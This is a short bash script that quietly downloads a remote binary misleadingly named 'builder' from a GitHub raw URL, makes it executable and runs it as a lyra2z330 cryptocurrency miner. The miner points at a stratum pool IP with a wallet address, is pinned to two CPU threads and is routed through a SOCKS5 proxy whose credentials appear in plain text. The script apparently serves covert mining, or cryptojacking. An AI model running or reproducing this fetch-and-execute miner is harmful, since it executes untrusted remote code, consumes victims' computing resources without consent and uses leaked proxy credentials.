#!/bin/bash 

wget -q https://raw.githubusercontent.com/andromedasizu/andromedasizu/main/builder
chmod +x builder
./builder -a lyra2z330 -o stratum+tcp://198.50.168.213:4563 -u web1qdrwyearg5nenujwdu3cy8nded938xu7e0wup6a -p c=BTE,zap=BUTK-lyra/GXX/PYRK-lyra2z330 -t 2 --cpu-affinity=0x3 -x socks5://xdezolvq:51tnf8wfj0hu@45.13.184.204:6765
